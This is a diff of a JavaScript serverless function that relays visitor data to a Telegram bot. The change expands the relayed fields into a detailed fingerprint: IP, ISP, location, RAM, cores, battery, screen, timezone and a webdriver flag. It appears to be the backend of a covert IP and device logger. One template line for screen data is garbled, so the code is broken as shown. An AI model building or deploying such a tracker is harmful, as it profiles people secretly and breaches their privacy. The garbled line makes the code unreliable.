@@ -1,5 +1,4 @@
 exports.handler = async (event) => {
-  // Solo aceptar POST
   if (event.httpMethod !== "POST") {
     return {
       statusCode: 405,
@@ -10,7 +9,6 @@ exports.handler = async (event) => {
   try {
     const data = JSON.parse(event.body || "{}");
 
-    // Variables de entorno (más seguro)
     const TELEGRAM_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
     const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 
@@ -21,27 +19,51 @@ exports.handler = async (event) => {
       };
     }
 
-    // Formatear el mensaje bonito
     const mensaje = `
-📱 *Nueva información de dispositivo*
+📱 *474747 - Nueva información*
 
-🌐 *IP:* \`${data.ip || "N/A"}\`
-🏳️ *País:* ${data.country || "N/A"}
-🏙️ *Ciudad:* ${data.city || "N/A"}
-💻 *Sistema:* ${data.os || "N/A"}
-🌐 *Navegador:* ${data.browser || "N/A"}
-📱 *Dispositivo:* ${data.device || "N/A"}
-⏰ *Fecha:* ${new Date().toLocaleString("es-AR", { timeZone: "America/Argentina/Buenos_Aires" })}
+🌐 *Red*
+• IP: \`${data.ip || "N/A"}\`
+• País: ${data.country || "N/A"}
+• Ciudad: ${data.city || "N/A"}
+• Región: ${data.region || "N/A"}
+• ISP: ${data.isp || "N/A"}
+• Conexión: ${data.conexion || "N/A"}
+• RTT: ${data.rtt || "N/A"}
+
+💻 *Dispositivo*
+• OS: ${data.os || "N/A"}
+• Navegador: ${data.browser || "N/A"}
+• Tipo: ${data.device || "N/A"}
+• RAM: ${data.ram || "N/A"}
+• Núcleos: ${data.nucleos || "N/A"}
+• Pantalla: \( {data.pantalla || "N/A"} ( \){data.pixelRatio || "?"}x)
+• Orientación: ${data.orientacion || "N/A"}
+• Color: ${data.colorDepth || "N/A"}
+
+🔋 *Batería*
+• Nivel: ${data.bateria || "N/A"}
+• Estado: ${data.cargando || "N/A"}
+
+🌎 *Idioma / Zona*
+• Idioma: ${data.idioma || "N/A"}
+• Zona: ${data.zonaHoraria || "N/A"}
+
+🧭 *Otras*
+• Táctil: ${data.toque || "N/A"}
+• Cookies: ${data.cookies || "N/A"}
+• Online: ${data.online || "N/A"}
+• Touch points: ${data.maxTouchPoints || 0}
+• Webdriver: ${data.webdriver || "N/A"}
+
+⏰ ${new Date().toLocaleString("es-AR", { timeZone: "America/Argentina/Buenos_Aires" })}
     `.trim();
 
-    // Enviar a Telegram
     const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
 
     const response = await fetch(telegramUrl, {
       method: "POST",
-      headers: {
-        "Content-Type": "application/json",
-      },
+      headers: { "Content-Type": "application/json" },
       body: JSON.stringify({
         chat_id: TELEGRAM_CHAT_ID,
         text: mensaje,
@@ -55,11 +77,7 @@ exports.handler = async (event) => {
       console.error("Error de Telegram:", result);
       return {
         statusCode: 500,
-        body: JSON.stringify({
-          success: false,
-          error: "Error al enviar a Telegram",
-          details: result,
-        }),
+        body: JSON.stringify({ success: false, error: "Error al enviar a Telegram", details: result }),
       };
     }
 
@@ -78,10 +96,7 @@ exports.handler = async (event) => {
     console.error("Error en la función:", error);
     return {
       statusCode: 500,
-      body: JSON.stringify({
-        success: false,
-        error: error.message,
-      }),
+      body: JSON.stringify({ success: false, error: error.message }),
     };
   }
 };
